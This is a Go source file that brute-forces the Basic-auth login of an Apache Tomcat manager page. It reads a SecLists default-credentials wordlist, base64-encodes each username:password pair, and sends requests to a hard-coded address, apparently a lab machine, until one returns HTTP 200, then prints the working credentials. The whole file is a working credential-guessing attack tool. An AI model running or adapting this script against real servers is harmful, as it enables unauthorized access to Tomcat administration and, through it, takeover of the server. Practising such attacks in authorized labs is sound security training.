package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
)

func makeRequest(url string, basicAuth string) int {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return 1
	}
	// How to add a basic auth header
	req.Header.Set("Authorization", "Basic "+basicAuth)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return 1
	}
	defer resp.Body.Close()
	return resp.StatusCode
}

func main() {
	file, err := os.Open("/usr/share/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt")
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	// Close the file once the function ends
	defer file.Close()

	// Create a scanner to read the file line by line
	scanner := bufio.NewScanner(file)

	fmt.Println("Starting Brute Force...\n")

	// Read each line in the file
	reqCount := 0
	for scanner.Scan() {
		ptBasicAuth := scanner.Text()
		strBytes := []byte(ptBasicAuth)

		b64BasicAuth := base64.StdEncoding.EncodeToString(strBytes)
		reqCount += 1
		fmt.Printf("\rSending Request: %d", reqCount)		
		statusCode := makeRequest("http://10.129.136.9:8080/manager/html", b64BasicAuth)
		if statusCode == 200{
			fmt.Println("\n\nCredentials Found:", ptBasicAuth)
			break
		}
	}

	// Check for any errors that occurred while scanning the file
	if err := scanner.Err(); err != nil {
		fmt.Println("Error scanning file:", err)
	}
}
